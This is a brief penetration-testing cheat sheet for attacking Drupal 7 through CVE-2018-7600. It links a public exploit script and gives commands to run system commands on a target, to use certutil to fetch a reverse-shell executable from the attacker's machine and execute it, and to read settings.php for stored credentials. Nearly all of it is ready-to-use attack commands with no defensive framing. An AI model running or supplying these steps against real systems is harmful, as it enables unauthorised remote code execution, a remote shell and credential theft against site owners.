#### Drupal 7
https://github.com/pimps/CVE-2018-7600
There are 2 python files, try each, one may work, one may not.
```bash - kali
python3 drupa7-CVE-2018-7600.py http://$TARGET/ -c whoami
```
[[1._Reverse Shells (WIN)#MSFVenom]]
```bash - kali
python3 drupa7-CVE-2018-7600.py http://$TARGET/ -c "certutil -urlcache -split -f http://$KALI/reverse64.exe"
```
```bash - kali
python3 drupa7-CVE-2018-7600.py http://$TARGET/ -c "reverse64.exe"
```
#### Check for settings.php for creds
```bash - kali
cat /var/www/html/sites/default/settings.php
```
